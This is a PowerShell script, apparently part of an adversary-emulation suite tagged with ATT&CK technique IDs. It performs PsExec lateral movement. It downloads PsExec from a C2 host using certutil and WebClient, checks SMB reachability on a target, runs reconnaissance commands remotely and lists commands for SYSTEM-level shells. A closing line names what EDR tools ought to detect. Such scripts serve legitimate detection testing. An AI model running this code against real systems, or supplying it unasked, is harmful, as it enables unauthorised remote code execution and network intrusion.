param(
    [Parameter(Mandatory=$true)]
    [string]$TargetIP,

    [Parameter(Mandatory=$true)]
    [string]$C2Host
)

$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting Lateral Movement - PsExec Remote Execution..." -ForegroundColor Cyan

# T1569.002 - System Services: Service Execution
# T1021.002 - Remote Services: SMB/Windows Admin Shares
# PsExec creates a service on the target to execute commands

Write-Host "[*] [T1569.002] PsExec remote command execution" -ForegroundColor Yellow
Write-Host "[!] Target: $TargetIP" -ForegroundColor Yellow

$stagingDir = "C:\temp\staging"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
$psexecPath = "$stagingDir\PsExec.exe"

# Step 1: Download PsExec
Write-Host "`n[*] [T1105] Downloading PsExec via certutil..."
certutil -urlcache -split -f "http://$C2Host/tools/PsExec.exe" $psexecPath

if (-not (Test-Path $psexecPath)) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://$C2Host/tools/PsExec.exe", $psexecPath)
    } catch {}
}

if (Test-Path $psexecPath) {
    Write-Host "[+] PsExec downloaded successfully" -ForegroundColor Green
    & $psexecPath -accepteula 2>&1 | Out-Null
    
    # Step 2: Test connectivity
    Write-Host "`n[*] Testing SMB connectivity to $TargetIP..."
    $smbTest = Test-NetConnection -ComputerName $TargetIP -Port 445 -WarningAction SilentlyContinue
    if ($smbTest.TcpTestSucceeded) {
        Write-Host "[+] SMB port 445 is open on $TargetIP" -ForegroundColor Green
    } else {
        Write-Host "[-] SMB port 445 is not reachable on $TargetIP" -ForegroundColor Red
    }
    
    # Step 3: Execute commands remotely via PsExec
    Write-Host "`n[*] [T1569.002] Executing remote commands via PsExec..."
    
    Write-Host "`n    CMD: PsExec.exe \\$TargetIP cmd /c hostname"
    & $psexecPath "\\$TargetIP" cmd /c "hostname" 2>&1
    
    Write-Host "`n    CMD: PsExec.exe \\$TargetIP cmd /c whoami"
    & $psexecPath "\\$TargetIP" cmd /c "whoami" 2>&1
    
    Write-Host "`n    CMD: PsExec.exe \\$TargetIP cmd /c ipconfig"
    & $psexecPath "\\$TargetIP" cmd /c "ipconfig /all" 2>&1

    # Step 4: Interactive shell (display only)
    Write-Host "`n[*] Interactive shell command:" -ForegroundColor Cyan
    Write-Host "    PsExec.exe \\$TargetIP -s cmd.exe  (SYSTEM shell)"
    Write-Host "    PsExec.exe \\$TargetIP -i -s powershell.exe  (interactive SYSTEM PS)"
    
} else {
    Write-Host "[-] PsExec not available. Ensure C2 hosts PsExec.exe" -ForegroundColor Red
}

Write-Host "`n[+] PsExec Lateral Movement Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: PsExec service creation (PSEXESVC), SMB lateral movement, remote service execution" -ForegroundColor Yellow
